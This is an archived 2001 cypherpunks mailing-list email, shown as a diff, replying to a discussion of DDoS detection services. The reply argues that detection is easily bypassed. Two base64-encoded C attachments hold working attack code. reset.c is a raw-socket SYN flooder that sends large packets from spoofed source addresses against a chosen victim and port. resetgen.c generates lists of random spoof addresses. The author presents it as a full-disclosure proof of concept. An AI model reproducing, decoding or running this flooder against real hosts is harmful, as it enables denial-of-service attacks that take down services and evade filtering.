@@ -1,0 +1,269 @@
+From owner-cypherpunks@Algebra.COM  Wed Feb  7 13:04:44 2001
+Received: from MIT.EDU (PACIFIC-CARRIER-ANNEX.MIT.EDU [18.69.0.28])
+	by positron.mit.edu (8.9.3/8.9.3) with SMTP id NAA29493
+	for <kwantam@positron.mit.edu>; Wed, 7 Feb 2001 13:04:43 -0500
+Received: from [208.233.99.160] by MIT.EDU with SMTP
+	id AA24341; Wed, 7 Feb 01 13:06:17 EST
+Received: (from majordom@localhost)
+	by ak47.algebra.com (8.11.1/8.11.1) id f17FLKA22177
+	for cypherpunks-outgoing; Wed, 7 Feb 2001 09:21:20 -0600
+X-Authentication-Warning: ak47.algebra.com: majordom set sender to owner-cypherpunks@Algebra.COM using -f
+Received: from sirius.infonex.com (sirius.infonex.com [216.34.245.2])
+	by ak47.algebra.com (8.11.1/8.11.1) with ESMTP id f17FL6q22160
+	for <cypherpunks@algebra.com>; Wed, 7 Feb 2001 09:21:07 -0600
+Received: (from cpunks@localhost) by sirius.infonex.com (8.8.8/8.8.8) id HAA10196; Wed, 7 Feb 2001 07:21:01 -0800 (PST)
+Received: from cyberpass.net (cyberpass.net [216.34.245.3]) by sirius.infonex.com (8.8.8/8.8.8) with ESMTP id HAA10185 for <cpunks@sirius.infonex.com>; Wed, 7 Feb 2001 07:20:53 -0800 (PST)
+Received: from security.za.net (security.za.net [196.2.146.22]) by cyberpass.net (8.8.8/8.7.3) with ESMTP id HAA11513 for <cypherpunks@cyberpass.net>; Wed, 7 Feb 2001 07:23:27 -0800 (PST)
+Received: from localhost (andrew@localhost)
+	by security.za.net (8.9.3/8.9.3) with ESMTP id RAA09036;
+	Wed, 7 Feb 2001 17:19:53 +0200 (SAST)
+	(envelope-from andrew@security.za.net)
+Date: Wed, 7 Feb 2001 17:19:53 +0200 (SAST)
+From: Andrew Alston <andrew@security.za.net>
+To: Adam Back <adam@cypherspace.org>
+Cc: rah@shipwright.com, cypherpunks@cyberpass.net, dcsb@ai.mit.edu
+Old-Subject: Re: IW: Tools Stunt DoS Attacks
+In-Reply-To: <200102060345.WAA00990@modemcable005.191-202-24.mtl.mc.videotron.ca>
+Message-Id: <Pine.BSF.4.21.0102071710190.8438-300000@security.za.net>
+Mime-Version: 1.0
+Content-Type: MULTIPART/MIXED; BOUNDARY="0-234155985-981559193=:8438"
+Subject:  Re: IW: Tools Stunt DoS Attacks
+X-Algebra: <A HREF=http://www.algebra.com>Algebra</A>
+Sender: owner-cypherpunks@Algebra.COM
+Precedence: bulk
+X-Mailing-List: cypherpunks@algebra.com
+X-List-Admin: ichudov@algebra.com
+X-Loop: cypherpunks@algebra.com
+Status: O
+Content-Length: 11810
+Lines: 228
+
+
+  This message is in MIME format.  The first part should be readable text,
+  while the remaining parts are likely unreadable without MIME-aware tools.
+  Send mail to mime@docserver.cac.washington.edu for more info.
+
+--0-234155985-981559193=:8438
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+
+Unfortunatly DDOS Attacks seem to be here to stay... There are a LOT of
+ways to bypass detection, one of them would be something to this
+effect... 
+
+I wrote this to test something after reading the original post, this took
+10 minutes, and it is a simple proof of case that there ARE ways around
+"Abnormal activity".  What is attached is very very simple, its your basic
+syn flooder with large packets (8k per packet), each packet coming from a
+different ip address (spoofed), obtained from a spoof file, this spoof
+file is then reused x number of times as specified by the cycle parameter.
+
+Please note: I didnt write this to use myself, I wrote this to test
+something and as a proof of case, and believing in total disclosure
+security policies and freedom of information Ive decided to open the code
+to see if anyone can find a way around this type of thing.
+
+The thing with this code, is that it is virtually impossible to block,
+along with the actual DOS code is a thing called resetgen.c, that
+resetgen.c generates another 1000 spoofed ips, if each host were to cycle
+their spoof files once, run that, cycle again, in a loop, and you ran this
+from a number of hosts at a time, the only way to block the traffic would
+be to firewall out the port in question completely, because the packet
+type is of type syn, if you block syn, nothing can connect to the port in
+question.
+
+Basically, people who claim to be able to stop DDOS/trace DDOS/etc etc I
+believe are playing on the public, making money out of a situation that
+unfortunatly has no end in site, due to the fuckups made in the IP
+protocol by the department of defense when they released the RFC.
+
+Cheers
+
+Andrew Alston
+
+
+On Mon, 5 Feb 2001, Adam Back wrote:
+
+> 
+> This sounds like just a short term work-around, easily countered by
+> the DoSers.
+> 
+> Rather than fix the problem, they propose to try to detect "unusual
+> activity" and block the IPs.  I'm not sure what "trace" means either
+> -- identify IPs and hunt down the perpetrators?
+> 
+> It's predictable low tech approach to all net problems -- identify
+> undesirable behavior, trace it, complain to ISPs, block it, form
+> coallitions against the behavior with central clearing houses of
+> people to block.
+> 
+> Ultimately you can't distinguish between DDoS and popular content.
+> They're just pushing the DDoS crowd to the next obvious and easy level
+> -- bypass their fingerprinting of unusual behavior.  They can't
+> counter-escalate much futher because they'll start getting into false
+> positives and rejecting legitimate traffic.
+> 
+> Any robust long term solution to DDoS needs to defend against DDoS
+> with Distributed Service.  If content can be mirrored and cached
+> reactively to traffic, mature versions of systems like FreeNet could
+> be built to cope with DDoS.  If requests are routed to local caches
+> there is no longer a central server taking all the traffic, which is
+> the basic problem these people are trying to kludge around.
+> 
+> They might want to look at Hash Cash and Client Puzzles for systems
+> which can't be easily distributed (web apps with central database
+> needing to be updated).
+> 
+> Adam
+> 
+> > Roughly a year after cyber-terrorists paralyzed some of the Web's
+> > most trafficked sites, technology is finally emerging to stop such
+> > distributed denial-of-service attacks before they ever reach their
+> > target sites.
+> > 
+> > [...]
+> > 
+> > To combat such attacks on routers, a new company called Arbor
+> > Networks--funded by Cisco and Intel--this week will launch a managed
+> > availability service that aims to detect, trace and block DoS
+> > attacks.
+> > 
+> > http://update.internetweek.com/cgi-bin4/flo?y=eCNx0Bd6gU0V30DDqD
+> 
+> 
+
+--0-234155985-981559193=:8438
+Content-Type: TEXT/PLAIN; charset=US-ASCII; name="reset.c"
+Content-Transfer-Encoding: BASE64
+Content-ID: <Pine.BSF.4.21.0102071719530.8438@security.za.net>
+Content-Description: 
+Content-Disposition: attachment; filename="reset.c"
+
+I2RlZmluZSBfX0JTRF9TT1VSQ0UNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2lu
+Y2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1
+ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNp
+bmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4N
+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2lu
+X3N5c3RtLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pcC5oPg0KI2luY2x1ZGUg
+PG5ldGluZXQvdGNwLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVk
+ZSA8dGltZS5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQoNCiNkZWZpbmUgUEFZ
+TE9BRCAyMDAwMAkJCS8qIEJ5dGVzIGZvciBvdXIgcGF5bG9hZCAqLw0KDQpz
+dHJ1Y3Qgc2xpc3Qgew0KCXN0cnVjdCBpbl9hZGRyICBzcG9vZjsNCglzdHJ1
+Y3Qgc2xpc3QgICAqbGluazsNCn07CQkJCQkvKiBTcG9vZiBsaXN0ICovDQoN
+CmludA0KbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KDQoJaW50
+IGksIGludDI7DQoJaW50ICAgICAgICAgICAgIHNvY2s7CQkvKiBTb2NrZXQg
+c3R1ZmYgKi8NCglpbnQgICAgICAgICAgICAgb24gPSAxOwkJLyogU29ja2V0
+IHN0dWZmICovDQoJc3RydWN0IHNvY2thZGRyX2luIHNvY2tzdHJ1Y3Q7CS8q
+IFNvY2tldCBzdHVmZiAqLw0KCXN0cnVjdCBpcCAgICAgICppcGhlYWQ7CQkv
+KiBJUCBIZWFkZXIgcG9pbnRlciAqLw0KCXN0cnVjdCB0Y3BoZHIgICp0Y3Bo
+ZWFkOwkvKiBUQ1AgSGVhZGVyIHBvaW50ZXIgKi8NCgljaGFyICAgICAgICAg
+ICAgZXZpbHBhY2tldFtzaXplb2Yoc3RydWN0IGlwKSArIHNpemVvZihzdHJ1
+Y3QNCnRjcGhkcikgKyA4MDAwXTsNCgkJCQkJLyogT3VyIHJlc2V0IHBhY2tl
+dCAqLw0KCWludCAgICAgICAgICAgICBzZXEsIGFjazsJLyogU2VxdWVuY2Ug
+YW5kIEFja25vd2xlZGdlbWVudCAjJ3MNCiovDQoJRklMRSAgICAgICAgICAg
+KnNwb29mZmlsZTsJLyogU3Bvb2YgZmlsZSAqLw0KCWNoYXIgICAgICAgICAg
+ICpidWZmZXI7CQkvKiBTcG9vZiBmaWxlIHJlYWQgYnVmZmVyICovDQoJc3Ry
+dWN0IHNsaXN0ICAgKnNjdXIsICpzZmlyc3Q7CS8qIFNwb29mIGxpbmtlZCBs
+aXN0IHBvaW50ZXJzICovDQoJY2hhciBzcmNbMjBdLCBkc3RbMjBdOwkJLyog
+V29yayBhcm91bmQgZm9yIGluZXRfbnRvYSBzdGF0aWMNCiovDQoJCQkJCS8q
+IFBvaW50ZXJzIHdoZW4gdXNpbmcgcHJpbnRmKCkgKi8NCglpbnQgZHBvcnQs
+IGRlbGF5OwkJLyogQ01EIExpbmUgc3R1ZmYgKi8NCglpbnQgY3ljbGVzOw0K
+CWludCB0YXJnZXQ7CQkJLyogVGFyZ2V0IGFkZHJlc3MgZnJvbSBpbmV0X2Fk
+ZHIoKQ0KKi8NCg0KDQoJaWYoYXJnYyA8IDYpIHsNCgkJZnByaW50ZihzdGRl
+cnIsICJVc2FnZTogJXMgc3Bvb2ZfZmlsZSB0YXJnZXQgZHBvcnQgZGVsYXkg
+Y3ljbGVzXG4iDQoJCSJzcG9vZl9maWxlID0gYWRkcmVzc2VzIHRvIHNwb29m
+IGZyb21cbiINCgkJInRhcmdldCA9IHlvdXIgdmljdGltXG4iDQoJCSJkcG9y
+dCA9IFBvcnQgd2UgYXJlIGF0dGFja2luZ1xuIg0KCQkiZGVsYXkgPSBEZWxh
+eSBpbiBtaWxsaXNlY29uZHMgYmV0d2VlbiBwYWNrZXRzXG4iDQoJCSJjeWNs
+ZXMgPSBOdW1iZXIgb2YgY3ljbGVzXG4iLCBhcmd2WzBdKTsNCgkJZXhpdCgt
+MSk7DQoJCX0NCgllbHNlIHsNCgkJZHBvcnQgPSBhdG9pKGFyZ3ZbM10pOw0K
+CQlkZWxheSA9IGF0b2koYXJndls0XSk7DQoJCWN5Y2xlcyA9IGF0b2koYXJn
+dls1XSk7DQoJCX07DQoJDQoJcHJpbnRmKCJVc2VkIHNwb29mIGZpbGUgJXNc
+biINCgkgICAgICAgIkRlc3RpbmF0aW9uOiBbJXNdIHBvcnQ6IFslZF1cbiIN
+CgkgICAgICAgIkRlbGF5IHRpbWUgWyVkXVxuIg0KCQkiQ3ljbGVzIFslZF1c
+biIsDQoJCWFyZ3ZbMV0sIGFyZ3ZbMl0sIGRwb3J0LCBkZWxheSwgY3ljbGVz
+KTsNCg0KCXNsZWVwKDEpOw0KDQoJYnplcm8oZXZpbHBhY2tldCwgc2l6ZW9m
+KGV2aWxwYWNrZXQpKTsNCgkJCQkJLyogQ2xlYW4gb3VyIHJlc2V0IHBhY2tl
+dCAqLw0KDQoJc2ZpcnN0ID0gbWFsbG9jKHNpemVvZihzdHJ1Y3Qgc2xpc3Qp
+KTsNCglzY3VyID0gc2ZpcnN0Ow0KCXNjdXItPmxpbmsgPSBOVUxMOwkJLyog
+U2V0dXAgb3VyIHNwb29mIGxpbmtlZCBsaXN0ICovDQoNCglpZighKGJ1ZmZl
+ciA9IG1hbGxvYygyNSkpKSB7DQoJCXBlcnJvcigibWFsbG9jIik7DQoJCWV4
+aXQoLTEpOw0KCQl9OwkJCS8qIEFsbG9jYXRlIGZvciByZWFkIGJ1ZmZlciAq
+Lw0KDQoJaWYgKChzcG9vZmZpbGUgPSBmb3BlbigoY2hhciAqKSBhcmd2WzFd
+LCAiciIpKSA8PSAwKSB7DQoJCXBlcnJvcigiZm9wZW4iKTsNCgkJZXhpdCgt
+MSk7CQkvKiBPcGVuIG91ciBzcG9vZiBmaWxlICovDQoJfSBlbHNlIHsNCgkJ
+d2hpbGUgKGZnZXRzKGJ1ZmZlciwgMjUsIHNwb29mZmlsZSkpIHsgCS8qIFJl
+YWQgdGlsbCBFT0YgKi8NCgkJCWlmICghKGluZXRfYXRvbihidWZmZXIsICYo
+c2N1ci0+c3Bvb2YpKSkpDQoJCQkJcHJpbnRmKCJJbnZhbGlkIGFkZHJlc3Mg
+Zm91bmQgaW4gdmljdGltDQpmaWxlLi4gaWdub3JpbmdcbiIpOw0KCQkJZWxz
+ZSB7DQoJCQkJc2N1ci0+bGluayA9IG1hbGxvYyhzaXplb2Yoc3RydWN0IHNs
+aXN0KSk7DQoJCQkJc2N1ciA9IHNjdXItPmxpbms7DQoJCQkJc2N1ci0+bGlu
+ayA9IE5VTEw7CS8qIEN5Y2xlIGwubGlzdCAqLw0KCQkJCX0NCgkJCX07CQkv
+KiBFbmQgb2Ygd2hpbGUgbG9vcCAqLw0KCQl9OwkJLyogRW5kIG9mIGlmIHt9
+IGVsc2Uge30gKi8NCgkNCg0KCWZyZWUoYnVmZmVyKTsJCQkvKiBGcmVlIHVw
+IG91ciByZWFkIGJ1ZmZlciAqLw0KCWZjbG9zZShzcG9vZmZpbGUpOwkJLyog
+Q2xvc2Ugb3VyIHNwb29mIGZpbGUgKi8NCglzY3VyID0gc2ZpcnN0OwkJCS8q
+IFNldCBzcG9vZiBsaXN0IGN1cnJlbnQgdG8gZmlyc3QNCiovDQoNCglpZiAo
+KHNvY2sgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19SQVcsIElQUFJPVE9fUkFX
+KSkgPCAwKSB7DQoJCXBlcnJvcigic29ja2V0Iik7DQoJCWV4aXQoLTEpOw0K
+CX0JCQkJLyogQWxsb2NhdGUgb3VyIHJhdyBzb2NrZXQgKi8NCg0KCWlmIChz
+ZXRzb2Nrb3B0KHNvY2ssIElQUFJPVE9fSVAsIElQX0hEUklOQ0wsIChjaGFy
+ICopICZvbiwNCnNpemVvZihvbikpIDwgMCkgew0KCQlwZXJyb3IoInNldHNv
+Y2tvcHQiKTsNCgkJZXhpdCgtMSk7DQoJfQkJCQkvKiBTZXQgc29ja2V0IG9w
+dGlvbnMgZm9yIHJhdyBpcGhlYWQNCiovDQoNCglzb2Nrc3RydWN0LnNpbl9m
+YW1pbHkgPSBBRl9JTkVUOw0KCWlwaGVhZCA9IChzdHJ1Y3QgaXAgKikgZXZp
+bHBhY2tldDsNCgl0Y3BoZWFkID0gKHN0cnVjdCB0Y3BoZHIgKikgKGV2aWxw
+YWNrZXQgKyBzaXplb2Yoc3RydWN0IGlwKSk7DQoJCQkJCS8qIEFsaWduIGlw
+IGFuZCB0Y3AgaGVhZGVycyAqLw0KDQoJaXBoZWFkLT5pcF9obCA9IDU7CQkv
+KiBJcCBoZWFkZXIgbGVuZ3RoIGlzIDUgKi8NCglpcGhlYWQtPmlwX3YgPSA0
+OwkJLyogaXB2NCAqLw0KCWlwaGVhZC0+aXBfbGVuID0gc2l6ZW9mKHN0cnVj
+dCBpcCkgKyBzaXplb2Yoc3RydWN0IHRjcGhkcikgKyA4MDAwOw0KCQkJCQkv
+KiBMZW5ndGggb2Ygb3VyIHRvdGFsIHBhY2tldCAqLw0KCWlwaGVhZC0+aXBf
+aWQgPSBodG9ucyhnZXRwaWQoKSk7CS8qIFBhY2tldCBJRCA9PSBQSUQgIyAq
+Lw0KCWlwaGVhZC0+aXBfdHRsID0gMjU1OwkJCS8qIFRpbWUgdG8gbGl2ZSA9
+PSAyNTUgKi8NCglpcGhlYWQtPmlwX3AgPSBJUFBST1RPX1RDUDsJCS8qIFRD
+UCBQYWNrZXQgKi8NCglpcGhlYWQtPmlwX3N1bSA9IDA7CQkJLyogTm8gY2hl
+Y2tzdW0gKi8NCglpcGhlYWQtPmlwX3RvcyA9IDA7CQkJLyogMCBUeXBlIG9m
+IFNlcnZpY2UgKi8NCglpcGhlYWQtPmlwX29mZiA9IDA7CQkJLyogT2Zmc2V0
+IGlzIDAgKi8NCgl0Y3BoZWFkLT50aF93aW4gPSBodG9ucyg1MTIpOwkJLyog
+VENQIFdpbmRvdyBpcyA1MTIgKi8NCgl0Y3BoZWFkLT50aF9mbGFncyA9IFRI
+X1NZTjsJCS8qIFN5biBwYWNrZXQgKi8NCgl0Y3BoZWFkLT50aF9vZmYgPSAw
+OwkvKiBUQ1AgT2Zmc2V0IDB4NTAgKi8NCg0KCWlwaGVhZC0+aXBfZHN0LnNf
+YWRkciA9IGluZXRfYWRkcihhcmd2WzJdKTsNCg0KCXNyYW5kKGdldHBpZCgp
+KTsJCQkvKiBTZWVkIGZvciByYW5kKCkgKi8NCglmb3IoaW50MiA9IDA7IGlu
+dDIgPCBjeWNsZXM7IGludDIrKykgew0KCQl3aGlsZSAoc2N1ci0+bGluayAh
+PSBOVUxMKSB7DQoJCQlzZXEgPSByYW5kKCkgJSB0aW1lKE5VTEwpOwkvKiBS
+YW5kb21pemUgb3VyICMncyAqLw0KCQkJYWNrID0gcmFuZCgpICUgdGltZShO
+VUxMKTsJLyogUmFuZG9taXplIGFjayAjJ3MgKi8NCgkJCXNvY2tzdHJ1Y3Qu
+c2luX3BvcnQgPSBodG9ucyhyYW5kKCkgJSB0aW1lKE5VTEwpKTsNCgkJCWlw
+aGVhZC0+aXBfc3JjID0gc2N1ci0+c3Bvb2Y7CS8qIFNldCB0aGUgc3Bvb2Zl
+ZCBhZGRyZXNzDQoJKi8NCgkJCXNvY2tzdHJ1Y3Quc2luX2FkZHIgPSBzY3Vy
+LT5zcG9vZjsNCgkJCXVzbGVlcChkZWxheSk7DQoJCQl0Y3BoZWFkLT50aF9z
+ZXEgPSBodG9ubChzZXEpOw0KCQkJdGNwaGVhZC0+dGhfYWNrID0gaHRvbmwo
+YWNrKTsNCgkJCXRjcGhlYWQtPnRoX2Rwb3J0ID0gaHRvbnMoZHBvcnQpOw0K
+CQkJdGNwaGVhZC0+dGhfc3BvcnQgPSBodG9ucygocmFuZCgpJTY0MDAwKSsx
+MDIzKTsNCgkJCXNucHJpbnRmKHNyYywgMjAsICIlcyIsIGluZXRfbnRvYShp
+cGhlYWQtPmlwX3NyYykpOw0KCQkJc25wcmludGYoZHN0LCAyMCwgIiVzIiwg
+aW5ldF9udG9hKGlwaGVhZC0+aXBfZHN0KSk7DQoJCQlwcmludGYoIlslZF0g
+Ynl0ZXMgWyVzOiVkXSAtPiBbJXM6JWRdXG4iLA0KCQkJCXNpemVvZihldmls
+cGFja2V0KSwgc3JjLCBudG9ocyh0Y3BoZWFkLT50aF9zcG9ydCksIFwNCgkJ
+CQlkc3QsIG50b2hzKHRjcGhlYWQtPnRoX2Rwb3J0KSk7IA0KCQkJc2VuZHRv
+KHNvY2ssICZldmlscGFja2V0LCBzaXplb2YoZXZpbHBhY2tldCksIDB4MCwg
+XA0KCQkJCShzdHJ1Y3Qgc29ja2FkZHIgKikmc29ja3N0cnVjdCwgc2l6ZW9m
+KHNvY2tzdHJ1Y3QpKTsNCgkJCQkJCQkvKiBTZW5kIG91ciBldmlsIHBhY2tl
+dCAqLw0KCQkJc2N1ciA9IHNjdXItPmxpbms7DQoJCX07DQoJCXNjdXIgPSBz
+Zmlyc3Q7DQoJfTsNCglyZXR1cm4gKDEpOw0KDQp9Ow0KDQoNCg==
+--0-234155985-981559193=:8438
+Content-Type: TEXT/PLAIN; charset=US-ASCII; name="resetgen.c"
+Content-Transfer-Encoding: BASE64
+Content-ID: <Pine.BSF.4.21.0102071719531.8438@security.za.net>
+Content-Description: 
+Content-Disposition: attachment; filename="resetgen.c"
+
+I2luY2x1ZGUgPHRpbWUuaD4NCg0KaW50IG1haW4oKSB7DQoJaW50IGk7DQoJ
+Y2hhciAqYnVmZmVyOw0KCWludCBvY3RldCA9IDA7DQoNCglzcmFuZChnZXRw
+aWQoKSk7DQoJZm9yKGkgPSAwOyBpIDwgMTAwMDsgaSsrKSB7DQoJCXByaW50
+ZigiJWQuJWQuJWQuJWRcbiIsKHJhbmQoKSU4MykrMTcyLCAocmFuZCgpJTgz
+KSsxNzIsIChyYW5kKCklODMpKzE3MiwgKHJhbmQoKSU4MykrMTcyKTsNCgl9
+Ow0KfTsNCg==
+--0-234155985-981559193=:8438--
+
